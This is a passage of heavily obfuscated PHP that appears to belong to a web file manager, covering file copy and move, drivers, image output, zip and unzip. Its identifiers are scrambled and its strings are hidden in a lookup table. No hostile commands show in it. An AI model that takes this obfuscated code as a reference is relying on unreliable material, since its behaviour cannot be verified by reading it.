$ÌğÍ©->pathParse[$Ì¸ÇßÅó[1173]]; $ÌğÍ© = self::driverMake($Ã¯”í«); } self::check($ÌğÍ©, $Ã¯”í«, $±î‡«ğ÷, $ş¾ë¡À); Hook::trigger($Ì¸ÇßÅó[1174], $ÌğÍ©, $Ã¯”í«, $±î‡«ğ÷, $ş¾ë¡À); $Ÿê“›û÷ = self::driverIsSame($ÌğÍ©, $±î‡«ğ÷); if ($Ÿê“›û÷) { if ($éì¦¾Ôğ == $Ì¸ÇßÅó[557] && !method_exists($±î‡«ğ÷, $Ì¸ÇßÅó[1175]) && trim($ş¾ë¡À, $Ì¸ÇßÅó[8]) == trim($±î‡«ğ÷->pathFather($Ã¯”í«), $Ì¸ÇßÅó[8])) { if ($ÌğÍ©->pathThis($Ã¯”í«) != $ÕÊƒ¯Ñ && !$ÌğÍ©->isTypeObject()) { return $ÌğÍ©->rename($Ã¯”í«, $ÕÊƒ¯Ñ); } return $±î‡«ğ÷->getPathOuter($Ã¯”í«); } if (method_exists($±î‡«ğ÷, $éì¦¾Ôğ)) { return $±î‡«ğ÷->{$éì¦¾Ôğ}($Ã¯”í«, $ş¾ë¡À, $àì“©Š¹, $ÕÊƒ¯Ñ); } } if ($Ÿê“›û÷ && $éì¦¾Ôğ == $Ì¸ÇßÅó[557] && $±î‡«ğ÷->getType() == $Ì¸ÇßÅó[106]) { $ƒ¬è…Ç² = $±î‡«ğ÷->movePath($Ã¯”í«, $ş¾ë¡À, $ÕÊƒ¯Ñ); if ($ƒ¬è…Ç²) { return $ƒ¬è…Ç²; } } $›é€¾ÜŞ = $ÌğÍ©->isFile($Ã¯”í«); if (!$›é€¾ÜŞ && $±î‡«ğ÷->getType() == $Ì¸ÇßÅó[777] && $ÌğÍ©->getType() == $Ì¸ÇßÅó[106]) { $ƒ¬è…Ç² = $±î‡«ğ÷->copyFolderFromIO($ÌğÍ©, $Ã¯”í«, $ş¾ë¡À, $àì“©Š¹, $ŒÊÀß£İ, $ÕÊƒ¯Ñ); } else { $ƒ¬è…Ç² = self::copyPath($ÌğÍ©, $Ã¯”í«, $±î‡«ğ÷, $ş¾ë¡À, $àì“©Š¹, $ŒÊÀß£İ, $›é€¾ÜŞ, $ÕÊƒ¯Ñ); } if ($ƒ¬è…Ç² && $ŒÊÀß£İ) { $ÌğÍ©->remove($Ã¯”í«); } if ($åÎ´•Œ¬) { $ƒ¬è…Ç² = $åÎ´•Œ¬->getPathOuter($ƒ¬è…Ç²); } return $ƒ¬è…Ç²; } private static function check($Íƒ°ÌÑÃ, $¬Š›ÏÓ, $èÑÁ¬ê÷, &$ì¾µÇé”) { $‹õ¿Ç  =& $_SERVER[ä¿÷‹µ±]; if (self::driverIsSame($Íƒ°ÌÑÃ, $èÑÁ¬ê÷) && $Íƒ°ÌÑÃ->isFolder($¬Š›ÏÓ) && $Íƒ°ÌÑÃ->isParentOf($¬Š›ÏÓ, $ì¾µÇé”)) { show_json(LNG($‹õ¿Ç [1176]), !1); } if (!$Íƒ°ÌÑÃ->exist($¬Š›ÏÓ)) { show_json(LNG($‹õ¿Ç [105]), !1); } } private static function copyPath($·¬«Äâ , $ —‡Ë÷Æ, $Í´ëË‘‡, $àœõ”“”, $­ê¿Á•¼, $€¤“ï¢², $ğî›¿ˆ, $Ü¨öŸÜÜ = false, $ê‚Êîè¯ = true) { $”ß­ı‹¦ =& $_SERVER[ä¿÷‹µ±]; $¹»ü ëØ = empty($Ü¨öŸÜÜ) && $Ü¨öŸÜÜ !== $”ß­ı‹¦[197] ? $·¬«Äâ ->pathThis($ —‡Ë÷Æ) : $Ü¨öŸÜÜ; if ($­ê¿Á•¼) { $»ïğ©¦¡ = $Í´ëË‘‡->fileNameExist($àœõ”“”, $¹»ü ëØ); $íòø† = $¹»ü ëØ; $¹»ü ëØ = $Í´ëË‘‡->fileNameAuto($àœõ”“”, $¹»ü ëØ, $­ê¿Á•¼, !$ğî›¿ˆ); if (!$»ïğ©¦¡ || $íòø† != $¹»ü ëØ) { $­ê¿Á•¼ = !1; } if ($ê‚Êîè¯ && !$­ê¿Á•¼) { $Í´ëË‘‡->_data[$”ß­ı‹¦[1177]] = !0; } } if ($ğî›¿ˆ) { return self::copyFile($·¬«Äâ , $ —‡Ë÷Æ, $Í´ëË‘‡, $àœõ”“”, $¹»ü ëØ, $€¤“ï¢²); } if ($­ê¿Á•¼ == REPEAT_RENAME_FOLDER) { $­ê¿Á•¼ = !1; } $Òó‘´áÇ = rtrim($àœõ”“”, $”ß­ı‹¦[8]) . $”ß­ı‹¦[8] . $¹»ü ëØ; $¥ÚáÈ„’ = $Í´ëË‘‡->mkdir($Í´ëË‘‡->getPath($Òó‘´áÇ), $­ê¿Á•¼); $àœõ”“” = $Í´ëË‘‡->getPathInner($¥ÚáÈ„’); $ÕãŒÄ«× = $·¬«Äâ ->listPath($ —‡Ë÷Æ, !0); $ÕãŒÄ«× = is_array($ÕãŒÄ«×) ? $ÕãŒÄ«× : array($”ß­ı‹¦[83] => array(), $”ß­ı‹¦[82] => array()); $öÌ˜¹° = array_merge($ÕãŒÄ«×[$”ß­ı‹¦[83]], $ÕãŒÄ«×[$”ß­ı‹¦[82]]); foreach ($öÌ˜¹° as $Íµò«¯) { $ğ¨†öŞÔ = $Íµò«¯[$”ß­ı‹¦[33]] == $”ß­ı‹¦[199]; $ —‡Ë÷Æ = $·¬«Äâ ->getPathInner($Íµò«¯[$”ß­ı‹¦[84]]); $Õâˆ½Èä = self::copyPath($·¬«Äâ , $ —‡Ë÷Æ, $Í´ëË‘‡, $àœõ”“”, $­ê¿Á•¼, $€¤“ï¢², $ğ¨†öŞÔ, !1, !1); if (!$Õâˆ½Èä) { IO::errorTips($”ß­ı‹¦[1178] . $ —‡Ë÷Æ . $”ß­ı‹¦[70] . $àœõ”“”); } } self::copyMoveKeepInfo($·¬«Äâ , $ —‡Ë÷Æ, $¥ÚáÈ„’); return $¥ÚáÈ„’; } private static function copyFile($¼»²Â¤‚, $„è‰Ò¾ò, $İ¦ÌÄéÑ, $£ì±á¶Ø, $µ¡¡»•š, $€ô‚ØÁÄ) { $şáçîıº =& $_SERVER[ä¿÷‹µ±]; $£ì±á¶Ø = $İ¦ÌÄéÑ->getPath(rtrim($£ì±á¶Ø, $şáçîıº[8]) . $şáçîıº[8] . $µ¡¡»•š); $ø»ÎÅ–¢ = $şáçîıº[1179] . time() . rand_string(5); Hook::trigger($şáçîıº[1180], $¼»²Â¤‚, $„è‰Ò¾ò, $İ¦ÌÄéÑ, $£ì±á¶Ø, $µ¡¡»•š, $ø»ÎÅ–¢); if (self::driverIsSame($¼»²Â¤‚, $İ¦ÌÄéÑ)) { if ($€ô‚ØÁÄ) { $éÓªÜ— = $İ¦ÌÄéÑ->moveFile($„è‰Ò¾ò, $£ì±á¶Ø); } else { $éÓªÜ— = $İ¦ÌÄéÑ->copyFile($„è‰Ò¾ò, $£ì±á¶Ø); } Hook::trigger($şáçîıº[1181], $¼»²Â¤‚, $„è‰Ò¾ò, $İ¦ÌÄéÑ, $£ì±á¶Ø, $µ¡¡»•š, $éÓªÜ—); self::copyMoveKeepInfo($¼»²Â¤‚, $„è‰Ò¾ò, $éÓªÜ—); return $éÓªÜ—; } $ÚìŞ°àº = TEMP_FILES; if ($GLOBALS[$şáçîıº[6]][$şáçîıº[89]][$şáçîıº[815]]) { $ÚìŞ°àº = $GLOBALS[$şáçîıº[6]][$şáçîıº[89]][$şáçîıº[815]]; } $½¦ö¦¥Â = $ÚìŞ°àº; mk_dir($½¦ö¦¥Â); $÷÷ƒô»³ = $½¦ö¦¥Â . $ø»ÎÅ–¢; $â­ÉöîÀ = $÷÷ƒô»³; $÷÷ƒô»³ = $¼»²Â¤‚->download($„è‰Ò¾ò, $÷÷ƒô»³); $÷÷ƒô»³ = $¼»²Â¤‚->iconvApp($÷÷ƒô»³); if (substr($÷÷ƒô»³, strlen($ÚìŞ°àº)) == $ÚìŞ°àº) { $€ô‚ØÁÄ = !0; } $éÓªÜ— = $İ¦ÌÄéÑ->upload($£ì±á¶Ø, $÷÷ƒô»³, $€ô‚ØÁÄ); self::remove($â­ÉöîÀ); Hook::trigger($şáçîıº[1181], $¼»²Â¤‚, $„è‰Ò¾ò, $İ¦ÌÄéÑ, $£ì±á¶Ø, $µ¡¡»•š, $éÓªÜ—); self::copyMoveKeepInfo($¼»²Â¤‚, $„è‰Ò¾ò, $éÓªÜ—); return $éÓªÜ—; } private static function copyMoveKeepInfo($«û²Øí’, $ÃöçÒ¿, $á¦‚ÊÖÊ) { if (!$á¦‚ÊÖÊ) { return; } $ˆàŞøÚ· = $«û²Øí’->info($ÃöçÒ¿); if (!is_array($ˆàŞøÚ·)) { return; } IO::setModifyTime($á¦‚ÊÖÊ, $ˆàŞøÚ·[$_SERVER[ä¿÷‹µ±][85]]); } public static function pathFather($ó—¯û«¦) { $É²õòúå = IO::init($ó—¯û«¦); $è¾õŠ· = $É²õòúå->pathFather($É²õòúå->path); return $É²õòúå->getPathOuter($è¾õŠ·); } public static function fileOut($ıùÈãˆ, $­ü¥÷¾ = false, $œµäìöö = false, $³úÛÆ„ã = '') { $ùÖ½¸’Í = self::driverMake($ıùÈãˆ); if ($ùÖ½¸’Í->isFileOutServer()) { return $ùÖ½¸’Í->fileOutServer($ıùÈãˆ, $­ü¥÷¾, $œµäìöö, $³úÛÆ„ã); } return $ùÖ½¸’Í->fileOut($ıùÈãˆ, $­ü¥÷¾, $œµäìöö, $³úÛÆ„ã); } public static function fileOutImage($‰èúÔÊº, $¶ş¨ĞÉğ = 250) { $¬ÚËš¨‡ = array(250, 600, 1200, 2000, 3000, 5000); for ($Œ¿ï¾§ = 0; $Œ¿ï¾§ < count($¬ÚËš¨‡); $Œ¿ï¾§++) { if ($Œ¿ï¾§ == 0 && $¶ş¨ĞÉğ <= $¬ÚËš¨‡[$Œ¿ï¾§]) { $¶ş¨ĞÉğ = $¬ÚËš¨‡[$Œ¿ï¾§]; break; } else { if ($¶ş¨ĞÉğ > $¬ÚËš¨‡[$Œ¿ï¾§ - 1] && $¶ş¨ĞÉğ <= $¬ÚËš¨‡[$Œ¿ï¾§]) { $¶ş¨ĞÉğ = $¬ÚËš¨‡[$Œ¿ï¾§]; break; } else { if ($Œ¿ï¾§ == count($¬ÚËš¨‡) - 1 && $¶ş¨ĞÉğ > $¬ÚËš¨‡[$Œ¿ï¾§]) { $¶ş¨ĞÉğ = $¬ÚËš¨‡[$Œ¿ï¾§]; break; } } } } $»‡ÜˆÁ = self::driverMake($‰èúÔÊº); if ($»‡ÜˆÁ->isFileOutServer()) { return $»‡ÜˆÁ->fileOutImageServer($‰èúÔÊº, $¶ş¨ĞÉğ); } return $»‡ÜˆÁ->fileOutImage($‰èúÔÊº, $¶ş¨ĞÉğ); } private static function driverIsSame($ğöü¥Ü², $íí¢¿¨ù) { $³Ê’ç’š =& $_SERVER[ä¿÷‹µ±]; $Êîê£½ = $ğöü¥Ü²->getType(); $«õû‘Ê— = $íí¢¿¨ù->getType(); if ($Êîê£½ != $«õû‘Ê—) { return !1; } if ($Êîê£½ == $³Ê’ç’š[777]) { return !0; } if ($Êîê£½ == $³Ê’ç’š[106]) { return !0; } if ($ğöü¥Ü²->pathDriver == $íí¢¿¨ù->pathDriver) { return !0; } return !1; } public static function copyUpdate($ø¦³š¾, $ŞÇôÚ°Ó) { $Ù‰©ÙÛç =& $_SERVER[ä¿÷‹µ±]; if (!IO::exist($ø¦³š¾)) { return !1; } if (!IO::exist($ŞÇôÚ°Ó)) { IO::mkdir($ŞÇôÚ°Ó); } $Ñİİ©Á¥ = self::_listAll($ø¦³š¾); $·Í«‘öÌ = self::_listAll($ŞÇôÚ°Ó); $ëœ»„ŞŠ = array(); $¯ïÆõ = array(); foreach ($Ñİİ©Á¥ as $ëŸøÚá÷ => $çâ©–‡©) { if (isset($·Í«‘öÌ[$ëŸøÚá÷])) { if ($çâ©–‡©[$Ù‰©ÙÛç[75]] == 1) { continue; } if ($·Í«‘öÌ[$ëŸøÚá÷][$Ù‰©ÙÛç[76]] == $çâ©–‡©[$Ù‰©ÙÛç[76]]) { continue; } } if ($çâ©–‡©[$Ù‰©ÙÛç[75]] == 1) { $¯ïÆõ[] = $ŞÇôÚ°Ó . $Ù‰©ÙÛç[8] . $ëŸøÚá÷; continue; } $¿Ğú§úÍ = strstr(trim($ëŸøÚá÷, $Ù‰©ÙÛç[8]), $Ù‰©ÙÛç[8]) ? get_path_father($ëŸøÚá÷) : $Ù‰©ÙÛç[12]; $ëœ»„ŞŠ[] = array($Ù‰©ÙÛç[1182] => $çâ©–‡©[$Ù‰©ÙÛç[84]], $Ù‰©ÙÛç[1183] => rtrim($ŞÇôÚ°Ó, $Ù‰©ÙÛç[8]) . $Ù‰©ÙÛç[8] . $¿Ğú§úÍ, $Ù‰©ÙÛç[1184] => $çâ©–‡©); } $İÃ­“° = array($Ù‰©ÙÛç[199] => $ëœ»„ŞŠ, $Ù‰©ÙÛç[75] => $¯ïÆõ); Hook::trigger($Ù‰©ÙÛç[1185], $ø¦³š¾, $ŞÇôÚ°Ó, $İÃ­“°); foreach ($¯ïÆõ as $çâ©–‡©) { IO::mkdir($çâ©–‡©); } foreach ($ëœ»„ŞŠ as $çâ©–‡©) { IO::copy($çâ©–‡©[$Ù‰©ÙÛç[1182]], $çâ©–‡©[$Ù‰©ÙÛç[1183]], REPEAT_REPLACE); } } private static function _listAll($òÇå«Í×) { $ÜÕ³„® =& $_SERVER[ä¿÷‹µ±]; $òÇå«Í× = KodIO::clear($òÇå«Í×); $ğÁò¿ò  = IO::listAll($òÇå«Í×); foreach ($ğÁò¿ò  as &$ú©¢şÏÜ) { $¼¤¶˜öã = substr($ú©¢şÏÜ[$ÜÕ³„®[84]], strlen($òÇå«Í×)); $ú©¢şÏÜ[$ÜÕ³„®[1186]] = trim($¼¤¶˜öã, $ÜÕ³„®[8]); } unset($ú©¢şÏÜ); return array_to_keyvalue($ğÁò¿ò , $ÜÕ³„®[1186]); } public static function fileSubstr($„ŸÑŸ¸, $“ùØÆ÷ê, $Ù²•Î¯¤ = false) { $˜—£Ÿı° =& $_SERVER[ä¿÷‹µ±]; $İì³ããê = self::driverMake($„ŸÑŸ¸); $œ‚‰¿Éü = $İì³ããê->size($„ŸÑŸ¸); $ş¬ı¶ÛØ = $“ùØÆ÷ê; $À¯çä¦Ë = $Ù²•Î¯¤; if ($“ùØÆ÷ê < 0) { $“ùØÆ÷ê = $œ‚‰¿Éü + $“ùØÆ÷ê; } if ($Ù²•Î¯¤ === !1) { $Ù²•Î¯¤ = $œ‚‰¿Éü - $“ùØÆ÷ê; } if ($“ùØÆ÷ê + $Ù²•Î¯¤ > $œ‚‰¿Éü) { $Ù²•Î¯¤ = $œ‚‰¿Éü - $“ùØÆ÷ê; } if (!$œ‚‰¿Éü && $İì³ããê->getType() == $˜—£Ÿı°[106] && !$İì³ããê->exist($„ŸÑŸ¸)) { $¹çîòú = get_path_this($„ŸÑŸ¸); $Æ¹†¢ú‡ = parse_url_query($¹çîòú); if (is_array($Æ¹†¢ú‡) && isset($Æ¹†¢ú‡[$˜—£Ÿı°[32]])) { $¹çîòú = urldecode($Æ¹†¢ú‡[$˜—£Ÿı°[32]]); } throw new Exception($˜—£Ÿı°[1187] . LNG($˜—£Ÿı°[1188]) . $˜—£Ÿı°[988] . clear_html($¹çîòú) . $˜—£Ÿı°[12]); } if ($Ù²•Î¯¤ <= 0) { return $˜—£Ÿı°[12]; } if ($“ùØÆ÷ê < 0 || $“ùØÆ÷ê >= $œ‚‰¿Éü || $Ù²•Î¯¤ > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\145\x52\x65\141\144\x20\x65\x72\162\157\x72\x21\40\x73\x74\x61\x72\x74\75{$“ùØÆ÷ê}\x3b\154\145\x6e\147\x74\x68\75{$Ù²•Î¯¤}\73\40\163\151\x7a\145\x3d{$œ‚‰¿Éü}\73"); } $‡•ë…ìÏ = $İì³ããê->fileSubstr($„ŸÑŸ¸, $“ùØÆ÷ê, $Ù²•Î¯¤); if (!$‡•ë…ìÏ && $Ù²•Î¯¤ && isset($GLOBALS[$˜—£Ÿı°[1189]])) { throw new Exception($GLOBALS[$˜—£Ÿı°[1189]][$˜—£Ÿı°[1190]]); } return $‡•ë…ìÏ; } private static function driverMake(&$ÚíÜÔ†) { $¢÷¥µÅ =& $_SERVER[ä¿÷‹µ±]; $Ÿ’±”²— = KodIO::parse($ÚíÜÔ†); if (!self::$driverListSystem) { $í…çœæ» = Model($¢÷¥µÅ[786])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($í…çœæ», $¢÷¥µÅ[399]); } if ($Ÿ’±”²—[$¢÷¥µÅ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ÿ’±”²—[$¢÷¥µÅ[399]]]) { return !1; } $ÚíÜÔ† = $Ÿ’±”²—[$¢÷¥µÅ[1191]]; $Èëûüš˜ = self::driverGet($Ÿ’±”²—, $ÚíÜÔ†); return $Èëûüš˜; } private static function driverGet($üç¸ÏÁà, &$è —ÆˆÈ) { $¥®Š…­¬ =& $_SERVER[ä¿÷‹µ±]; $»íş±ˆ÷ = $üç¸ÏÁà[$¥®Š…­¬[1192]]; $–ª‹ãúÄ = $üç¸ÏÁà[$¥®Š…­¬[399]]; switch ($üç¸ÏÁà[$¥®Š…­¬[33]]) { case KodIO::KOD_IO: $ëïØ×¶ = self::$driverListSystem[$–ª‹ãúÄ]; break; case KodIO::KOD_SOURCE: $è —ÆˆÈ = $–ª‹ãúÄ . $è —ÆˆÈ; $ëïØ×¶ = array($¥®Š…­¬[1193] => $¥®Š…­¬[1194], $¥®Š…­¬[6] => $üç¸ÏÁà); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ø¡ğŒÁÖ = $GLOBALS[$¥®Š…­¬[1195]]; self::$driverListUser = array_to_keyvalue($Ø¡ğŒÁÖ, $¥®Š…­¬[399]); } $ëïØ×¶ = self::$driverListUser[$–ª‹ãúÄ]; break; case KodIO::KOD_SHARE_LINK: $ëïØ×¶ = array($¥®Š…­¬[1193] => $¥®Š…­¬[1196], $¥®Š…­¬[6] => $üç¸ÏÁà); $øí–ì“ = Action($¥®Š…­¬[1197])->sharePathInfo($üç¸ÏÁà[$¥®Š…­¬[84]]); $è —ÆˆÈ = $øí–ì“[$¥®Š…­¬[402]]; if (!$øí–ì“[$¥®Š…­¬[402]]) { $‹ì£Ã’ = Model($¥®Š…­¬[601])->getInfo($øí–ì“[$¥®Š…­¬[489]]); $è —ÆˆÈ = KodIO::clear($‹ì£Ã’[$¥®Š…­¬[1198]] . $üç¸ÏÁà[$¥®Š…­¬[1191]]); $üç¸ÏÁà[$¥®Š…­¬[487]] = $‹ì£Ã’; $üç¸ÏÁà[$¥®Š…­¬[1173]] = $è —ÆˆÈ; $ëïØ×¶ = array($¥®Š…­¬[1193] => $¥®Š…­¬[1199], $¥®Š…­¬[6] => $üç¸ÏÁà); } break; case KodIO::KOD_SHARE_ITEM: $ëïØ×¶ = array($¥®Š…­¬[1193] => $¥®Š…­¬[1200], $¥®Š…­¬[6] => $üç¸ÏÁà); $‹ì£Ã’ = Model($¥®Š…­¬[601])->getInfo($üç¸ÏÁà[$¥®Š…­¬[399]]); if ($‹ì£Ã’[$¥®Š…­¬[402]] == $¥®Š…­¬[197]) { $è —ÆˆÈ = KodIO::clear($‹ì£Ã’[$¥®Š…­¬[1198]] . $üç¸ÏÁà[$¥®Š…­¬[1191]]); $üç¸ÏÁà[$¥®Š…­¬[487]] = $‹ì£Ã’; $üç¸ÏÁà[$¥®Š…­¬[1173]] = $è —ÆˆÈ; $ëïØ×¶ = array($¥®Š…­¬[1193] => $¥®Š…­¬[1201], $¥®Š…­¬[6] => $üç¸ÏÁà); } else { if (!$è —ÆˆÈ) { $è —ÆˆÈ = $‹ì£Ã’[$¥®Š…­¬[402]]; } } break; default: $è —ÆˆÈ = $üç¸ÏÁà[$¥®Š…­¬[84]]; $ëïØ×¶ = array($¥®Š…­¬[1193] => $¥®Š…­¬[1202]); break; } $”îÄ±…¸ = $üç¸ÏÁà[$¥®Š…­¬[84]]; if (!isset(self::$driverCache[$”îÄ±…¸])) { $ÍÓñ— = strtolower($ëïØ×¶[$¥®Š…­¬[95]]); $ó¼Ş±•÷ = $GLOBALS[$¥®Š…­¬[6]][$¥®Š…­¬[89]][$¥®Š…­¬[845]]; $–ÕóŸÚÑ = $¥®Š…­¬[74] . (isset($ó¼Ş±•÷[$ÍÓñ—]) ? $ó¼Ş±•÷[$ÍÓñ—] : ucfirst($ÍÓñ—)); if (!class_exists($–ÕóŸÚÑ)) { show_json("{$–ÕóŸÚÑ}\40\156\157\x74\x20\145\170\151\163\x74\163\x21", !1); } $•ªà†Â = isset($ëïØ×¶[$¥®Š…­¬[6]]) ? $ëïØ×¶[$¥®Š…­¬[6]] : !1; self::$driverCache[$”îÄ±…¸] = new $–ÕóŸÚÑ($•ªà†Â); } $Ï‰ ê¥Š = self::$driverCache[$”îÄ±…¸]; $Ï‰ ê¥Š->pathDriver = $»íş±ˆ÷; $Ï‰ ê¥Š->pathBase = $¥®Š…­¬[12]; if (isset($ëïØ×¶[$¥®Š…­¬[6]][$¥®Š…­¬[1203]])) { $Ï‰ ê¥Š->pathBase = rtrim($ëïØ×¶[$¥®Š…­¬[6]][$¥®Š…­¬[1203]], $¥®Š…­¬[8]) . $¥®Š…­¬[8]; $è —ÆˆÈ = $Ï‰ ê¥Š->pathBase . ltrim($è —ÆˆÈ, $¥®Š…­¬[8]); } $è —ÆˆÈ = $Ï‰ ê¥Š->getPath($è —ÆˆÈ); if (isset($üç¸ÏÁà[$¥®Š…­¬[1173]])) { $è —ÆˆÈ = $üç¸ÏÁà[$¥®Š…­¬[1173]]; } $Ï‰ ê¥Š->path = $è —ÆˆÈ; return $Ï‰ ê¥Š; } public static function errorTips($ÅÙŞÖ€Ğ = false) { $¸ˆ¯íÁê =& $_SERVER[ä¿÷‹µ±]; static $çë ŠÈë = array(); $¸Ë»½ßæ = 1000; if ($ÅÙŞÖ€Ğ === -1) { return $çë ŠÈë ? $çë ŠÈë[count($çë ŠÈë) - 1] : $¸ˆ¯íÁê[12]; } if ($ÅÙŞÖ€Ğ === !1) { return implode($¸ˆ¯íÁê[231], $çë ŠÈë); } if (count($çë ŠÈë) >= $¸Ë»½ßæ) { $çë ŠÈë = array_slice($çë ŠÈë, $¸Ë»½ßæ * 0.5, $¸Ë»½ßæ); } $çë ŠÈë[] = $ÅÙŞÖ€Ğ; write_log($¸ˆ¯íÁê[162] . ACTION . $¸ˆ¯íÁê[1204] . $ÅÙŞÖ€Ğ, $¸ˆ¯íÁê[1205]); } public static function getLastError($êÉ­‡õÎ = '') { $ü¹›î = self::errorTips(-1); return $ü¹›î ? $ü¹›î : $êÉ­‡õÎ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $•»¾…˜; if (!$•»¾…˜) { $ŞùÇ»õ = IO::init($_SERVER[ä¿÷‹µ±][8]); } return $ŞùÇ»õ; } private static function iconvSystem($·Ï±Ú°) { return self::local()->iconvSystem($·Ï±Ú°); } private static function iconvApp($ƒ­Ó®•) { return self::local()->iconvApp($ƒ­Ó®•); } public static function zip($›½Òûäª, $ŸÖÒìÔƒ = "\x7a\x69\160", $§İ¦àÚÀ = '', $–ï£Êü = REPEAT_RENAME) { $ğ‚îà =& $_SERVER[ä¿÷‹µ±]; $•àó½ = self::init($›½Òûäª[0][$ğ‚îà[84]]); $Ò¹¤ìÕ˜ = self::info($›½Òûäª[0][$ğ‚îà[84]]); $Ãßøõ®° = !1; if (!$§İ¦àÚÀ && $•àó½->getType() == $ğ‚îà[106]) { $È¾Á­İ = self::zipFileList($›½Òûäª); } else { $Ãßøõ®° = $§İ¦àÚÀ ? $§İ¦àÚÀ : TEMP_FILES . $ğ‚îà[1206] . time() . rand_string(8) . $ğ‚îà[8]; mk_dir($Ãßøõ®°); $È¾Á­İ = self::zipFileList($›½Òûäª, $Ãßøõ®°); } $ í¡€² = $Ò¹¤ìÕ˜[$ğ‚îà[32]]; if (count($È¾Á­İ) > 1) { $æ…ä¡ = IO::info(IO::pathFather($Ò¹¤ìÕ˜[$ğ‚îà[84]])); $ í¡€² = $æ…ä¡[$ğ‚îà[32]]; } $š½ŠúšÚ = $Ãßøõ®°; if (!$š½ŠúšÚ) { $š½ŠúšÚ = get_path_father($Ò¹¤ìÕ˜[$ğ‚îà[84]]); if (!$§İ¦àÚÀ && $•àó½->getType() == $ğ‚îà[106]) { $š½ŠúšÚ = get_path_father($•àó½->path); } $ğŒ¹áê· = IO::info($š½ŠúšÚ); if (!$ğŒ¹áê·[$ğ‚îà[202]]) { show_json(LNG($ğ‚îà[1207]), !1); } } $Ñúõ“‡¾ = $š½ŠúšÚ . $ í¡€² . $ğ‚îà[10] . $ŸÖÒìÔƒ; $Ñúõ“‡¾ = get_filename_auto($Ñúõ“‡¾, $ğ‚îà[12], $–ï£Êü); $ÓÌ¦äúô = self::iconvSystem($Ñúõ“‡¾); foreach ($È¾Á­İ as $ˆÃÉş´ => $Ù¤®´Ê) { $È¾Á­İ[$ˆÃÉş´] = self::iconvSystem($Ù¤®´Ê); } KodArchive::create($ÓÌ¦äúô, $È¾Á­İ); if (!IO::exist($Ñúõ“‡¾)) { if ($Ãßøõ®°) { del_dir($Ãßøõ®°); } show_json(LNG($ğ‚îà[1208]), !1); } if ($§İ¦àÚÀ || !$Ãßøõ®°) { if ($Ãßøõ®° && strstr($Ãßøõ®°, TEMP_FILES)) { $¯úÍ·ŒË = $È¾Á­İ = array(); recursion_dir($š½ŠúšÚ, $¯úÍ·ŒË, $È¾Á­İ, 0); foreach ($¯úÍ·ŒË as $§ËÌîß) { del_dir($§ËÌîß); } foreach ($È¾Á­İ as $˜Ñ¼ü‹ò) { if ($˜Ñ¼ü‹ò == $ÓÌ¦äúô) { continue; } del_file($˜Ñ¼ü‹ò); } } return $Ñúõ“‡¾; } $Óû‘¾º = self::pathFather($Ò¹¤ìÕ˜[$ğ‚îà[84]]); $·åéßã´ = self::move($Ñúõ“‡¾, $Óû‘¾º, $–ï£Êü); if (!$·åéßã´) { del_dir($Ãßøõ®°); show_json(LNG($ğ‚îà[1208]), !1); } del_dir($Ãßøõ®°); return $·åéßã´; } public static function unzip($é Â¨Â¯, $ÚÖõÆôØ = "\x72\x65\x70\154\x61\x63\x65") { $ëÓ²×Á± =& $_SERVER[ä¿÷‹µ±]; $ª»‚úáä = $é Â¨Â¯[$ëÓ²×Á±[84]]; $­Ã…®¯• = $é Â¨Â¯[$ëÓ²×Á±[1209]]; if (!($¨Ä¬¼Ã = parent::info($ª»‚úáä))) { show_json(LNG($ëÓ²×Á±[1210]), !1); } if (!($Äô‰ÏÕ¯ = parent::infoFull($­Ã…®¯•))) { $­Ã…®¯• = parent::mkdir($­Ã…®¯•); $Äô‰ÏÕ¯ = array($ëÓ²×Á±[84] => $­Ã…®¯•); } else { if (isset($Äô‰ÏÕ¯[$ëÓ²×Á±[402]]) && trim($Äô‰ÏÕ¯[$ëÓ²×Á±[84]], $ëÓ²×Á±[8]) != trim($­Ã…®¯•, $ëÓ²×Á±[8])) { $ÙÑ¥­ = KodIO::make($Äô‰ÏÕ¯[$ëÓ²×Á±[432]]); $¡Ó¾Ù¨ = parent::fileNameAuto($ÙÑ¥­, $Äô‰ÏÕ¯[$ëÓ²×Á±[32]], REPEAT_RENAME_FOLDER, !0); $­Ã…®¯• = parent::mkdir($ÙÑ¥­ . $¡Ó¾Ù¨); $Äô‰ÏÕ¯ = array($ëÓ²×Á±[84] => $­Ã…®¯•); } } $­Ã…®¯• = $Äô‰ÏÕ¯[$ëÓ²×Á±[84]]; $ÃŞš±è¡ = self::tmpFileName($¨Ä¬¼Ã); $Ú¶®„ê = TEMP_FILES . $ÃŞš±è¡; del_dir($Ú¶®„ê); mk_dir($Ú¶®„ê); $ğ†«¦¡¸ = self::fileExt($¨Ä¬¼Ã); $‰¤ïÎÕâ = $Ú¶®„ê . $ëÓ²×Á±[10] . $ğ†«¦¡¸; if (!@file_exists(self::iconvSystem($‰¤ïÎÕâ))) { $å¢ÊÜ«Á = self::localFilePath($ª»‚úáä, $ğ†«¦¡¸); $‰¤ïÎÕâ = $å¢ÊÜ«Á ? $å¢ÊÜ«Á : parent::download($ª»‚úáä, $‰¤ïÎÕâ); } $‰¤ïÎÕâ = self::iconvSystem($‰¤ïÎÕâ); $«ˆ·«õ™ = isset($é Â¨Â¯[$ëÓ²×Á±[1211]]) ? $é Â¨Â¯[$ëÓ²×Á±[1211]] : $ëÓ²×Á±[1212]; $´ğà¡ñò = KodArchive::extract($‰¤ïÎÕâ, $Ú¶®„ê . $ëÓ²×Á±[8], $«ˆ·«õ™); self::archiveExt(); if (!$´ğà¡ñò[$ëÓ²×Á±[1213]]) { show_json($ëÓ²×Á±[1214] . $´ğà¡ñò[$ëÓ²×Á±[1215]], !1); } Hook::trigger($ëÓ²×Á±[1216], $Ú¶®„ê); recursion_dir($Ú¶®„ê, $§Ãô•´é, $„ÏÙ—ü¼, 0); $•×ïÅäğ = array_merge($§Ãô•´é, $„ÏÙ—ü¼); foreach ($•×ïÅäğ as $ÌòÆœñ) { $ÌòÆœñ = self::iconvApp($ÌòÆœñ); self::move($ÌòÆœñ, $­Ã…®¯•, $ÚÖõÆôØ); } del_dir($Ú¶®„ê); if (!$å¢ÊÜ«Á) { del_file($‰¤ïÎÕâ); } return !0; } public static function unzipList($Ö¸÷ˆ¦) { $ğÜãÔØù =& $_SERVER[ä¿÷‹µ±]; $«æÅì–° = $Ö¸÷ˆ¦[$ğÜãÔØù[84]]; 